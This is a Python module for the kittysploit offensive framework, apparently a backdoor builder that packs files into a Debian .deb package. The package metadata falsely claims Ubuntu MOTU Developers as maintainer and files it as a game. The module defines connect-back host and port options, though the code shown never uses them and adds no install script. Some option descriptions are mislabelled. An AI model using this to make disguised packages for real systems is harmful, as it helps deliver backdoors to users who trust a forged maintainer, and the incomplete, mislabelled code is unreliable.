from kittysploit import *
import os
import tarfile
from pathlib import Path

class Module(Backdoor):
    
    __info__ = {
        'name': 'Debian Package Creator',
        'description': 'Debian Package Creator',
    }

    lhost = OptString('127.0.0.1','Connect-back IP address', True)
    lport = OptPort(5555,'Connect-back TCP Port', True)

    package_name = OptString("xlibd", "Target IPv4, IPv6 address: 192.168.1.1", True)
    version = OptString("1.6", "Target IPv4, IPv6 address: 192.168.1.1", True)
    

    def create_ar_archive(self, output_filename, *files):
        """
        Create an ar archive from the given files.
        """
        def pad(name):
            return name + ' ' * (16 - len(name))

        def write_ar_file(archive, filename, data):
            archive.write(b'!<arch>\n')  # ar archive magic number
            for name, content in data.items():
                archive.write(pad(name).encode('utf-8'))
                archive.write(b'0           ')  # timestamp
                archive.write(b'0     ')  # owner id
                archive.write(b'0     ')  # group id
                archive.write(b'100644  ')  # file mode
                archive.write(f'{len(content):<10}'.encode('utf-8'))  # file size
                archive.write(b'`\n')  # file magic number
                archive.write(content)
                if len(content) % 2 != 0:
                    archive.write(b'\n')  # ar files are 2-byte aligned

        file_data = {}
        for file in files:
            with open(file, 'rb') as f:
                file_data[Path(file).name] = f.read()

        with open(output_filename, 'wb') as archive:
            write_ar_file(archive, output_filename, file_data)

    def create_control_tar(self, control_content, output_filename):
        """
        Create a control.tar.gz file with the given control content.
        """
        control_file_path = "control"
        with open(control_file_path, 'w') as f:
            f.write(control_content)

        with tarfile.open(output_filename, "w:gz") as tar:
            tar.add(control_file_path, arcname='control')

        os.remove(control_file_path)

    def create_data_tar(self, source_dir, output_filename):
        """
        Create a data.tar.gz file from the given directory.
        """
        with tarfile.open(output_filename, "w:gz") as tar:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_dir)
                    tar.add(file_path, arcname=arcname)

    def run(self):
        data = "output"
        package_dir = Path(f"{self.package_name}_{self.version}_all")
        control = f"""Package: {self.package_name}
Version: {self.version}
Section: Games and Amusement
Priority: optional
Architecture: all
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: MDPC kimi (SSA-RedTeam development 2017)"""
        
        # Ensure the directory exists
        package_dir.mkdir(parents=True, exist_ok=True)
        
        # Create debian-binary file
        debian_binary_path = package_dir / "debian-binary"
        with open(debian_binary_path, 'w') as f:
            f.write("2.0\n")
        
        # Create control.tar.gz file
        control_tar_path = package_dir / "control.tar.gz"
        self.create_control_tar(control, control_tar_path)

        # Create data.tar.gz file
        data_tar_path = package_dir / "data.tar.gz"
        self.create_data_tar(data, data_tar_path)
        
        # Create .deb package using pure Python
        deb_file_path = Path(f"{self.package_name}_{self.version}_all.deb")
        self.create_ar_archive(deb_file_path, debian_binary_path, control_tar_path, data_tar_path)
